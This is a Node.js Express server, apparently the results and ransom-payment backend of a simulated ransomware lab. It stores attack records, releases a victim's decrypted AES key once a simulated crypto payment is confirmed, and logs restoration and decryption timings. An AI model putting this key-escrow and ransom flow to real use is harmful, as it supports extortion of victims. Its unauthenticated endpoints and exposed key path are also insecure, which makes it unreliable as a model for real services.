const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const app = express();

const PUERTO = process.env.PUERTO || 3000;
const RESULTADOS_PATH = process.env.RESULTADOS_PATH || "/app/resultados/resultados.json";
const RSA_PRIVADA_PATH = process.env.RSA_PRIVADA_PATH || "/app/llaves/rsa_privada.pem";

app.use(express.json({ limit: "5mb" }));

function asegurarArchivoResultados() {
    const directorio = path.dirname(RESULTADOS_PATH);

    if (!fs.existsSync(directorio)) {
        fs.mkdirSync(directorio, { recursive: true });
    }

    if (!fs.existsSync(RESULTADOS_PATH)) {
        fs.writeFileSync(RESULTADOS_PATH, "[]", "utf8");
    }
}

function leerResultados() {
    asegurarArchivoResultados();

    const contenido = fs.readFileSync(RESULTADOS_PATH, "utf8").trim();

    if (!contenido) {
        return [];
    }

    return JSON.parse(contenido);
}

function guardarResultados(resultados) {
    asegurarArchivoResultados();

    fs.writeFileSync(
        RESULTADOS_PATH,
        JSON.stringify(resultados, null, 2),
        "utf8"
    );
}

function buscarRegistro(resultados, idAtaque) {
    return resultados.find((registro) => registro.id_ataque === idAtaque);
}

app.get("/estado", (req, res) => {
    res.json({
        estado: "ok",
        servicio: "Backend de resultados",
        fecha: new Date().toISOString()
    });
});

app.get("/llave-rsa/estado", (req, res) => {
    res.json({
        disponible: fs.existsSync(RSA_PRIVADA_PATH),
        ruta: RSA_PRIVADA_PATH
    });
});

app.get("/resultados", (req, res) => {
    try {
        const resultados = leerResultados();
        res.json(resultados);
    } catch (error) {
        res.status(500).json({
            error: "No se pudieron leer los resultados",
            detalle: error.message
        });
    }
});

app.post("/resultados", (req, res) => {
    try {
        const resultados = leerResultados();
        const registro = req.body;

        resultados.push(registro);
        guardarResultados(resultados);

        res.json({
            ok: true,
            mensaje: "Resultado guardado",
            id_ataque: registro.id_ataque
        });
    } catch (error) {
        res.status(500).json({
            error: "No se pudo guardar el resultado",
            detalle: error.message
        });
    }
});

app.post("/rescate/pagar", (req, res) => {
    try {
        const { id_ataque } = req.body;

        if (!id_ataque) {
            return res.status(400).json({
                error: "Falta id_ataque"
            });
        }

        const resultados = leerResultados();
        const registro = buscarRegistro(resultados, id_ataque);

        if (!registro) {
            return res.status(404).json({
                error: "No se encontró el registro del ataque"
            });
        }

        const llaveAESCifradaBase64 = registro.llave?.llave_aes_cifrada;

        if (!llaveAESCifradaBase64) {
            return res.status(400).json({
                error: "El registro no contiene llave AES cifrada"
            });
        }

        if (!fs.existsSync(RSA_PRIVADA_PATH)) {
            return res.status(500).json({
                error: "No existe la llave RSA privada"
            });
        }

        const llavePrivada = fs.readFileSync(RSA_PRIVADA_PATH, "utf8");
        const llaveAESCifrada = Buffer.from(llaveAESCifradaBase64, "base64");

        const llaveAESRaw = crypto.privateDecrypt(
            {
                key: llavePrivada,
                padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
                oaepHash: "sha256"
            },
            llaveAESCifrada
        );

        registro.rescate = {
            ...(registro.rescate || {}),
            nota_mostrada: true,
            pago: true,
            pago_simulado: true,
            moneda: "criptomoneda_simulada",
            fecha_pago: new Date().toISOString(),
            descifrado_habilitado: true
        };

        guardarResultados(resultados);

        res.json({
            ok: true,
            mensaje: "Pago simulado confirmado",
            id_ataque,
            llave_aes_base64: llaveAESRaw.toString("base64"),
            archivos: registro.archivos
        });
    } catch (error) {
        res.status(500).json({
            error: "No se pudo procesar el pago simulado",
            detalle: error.message
        });
    }
});

app.post("/rescate/finalizar", (req, res) => {
    try {
        const { id_ataque, resultado_descifrado } = req.body;

        if (!id_ataque) {
            return res.status(400).json({
                error: "Falta id_ataque"
            });
        }

        const resultados = leerResultados();
        const registro = buscarRegistro(resultados, id_ataque);

        if (!registro) {
            return res.status(404).json({
                error: "No se encontró el registro del ataque"
            });
        }

        const detalleDescifrado = resultado_descifrado?.detalle || [];

        if (registro.archivos && Array.isArray(registro.archivos.detalle)) {
            const mapaDescifrado = new Map();

            for (const item of detalleDescifrado) {
                mapaDescifrado.set(item.nombre, item);
            }

            registro.archivos.detalle = registro.archivos.detalle.map((archivo) => {
                const restaurado = mapaDescifrado.get(archivo.nombre);

                if (!restaurado) {
                    return archivo;
                }

                return {
                    ...archivo,
                    sha256_descifrado: restaurado.sha256_descifrado || null,
                    integridad: restaurado.integridad,
                    restaurado: restaurado.restaurado,
                    estado_restauracion: restaurado.estado,
                    error_restauracion: restaurado.error || null
                };
            });
        }

        registro.estado = "archivos_restaurados";
        registro.fecha_restauracion = new Date().toISOString();

        registro.rescate = {
            ...(registro.rescate || {}),
            pago: true,
            pago_simulado: true,
            descifrado_habilitado: true,
            restauracion_completada: true
        };

        registro.webcrypto = {
            ...(registro.webcrypto || {}),
            tiempo_descifrado_ms: resultado_descifrado?.tiempo_descifrado_ms,
            velocidad_descifrado_mib_s: resultado_descifrado?.velocidad_descifrado_mib_s
        };

        registro.descifrado = resultado_descifrado;

        guardarResultados(resultados);

        res.json({
            ok: true,
            mensaje: "Resultado de restauración guardado",
            id_ataque
        });
    } catch (error) {
        res.status(500).json({
            error: "No se pudo finalizar la restauración",
            detalle: error.message
        });
    }
});

app.listen(PUERTO, () => {
    console.log(`Backend de resultados escuchando en puerto ${PUERTO}`);
});
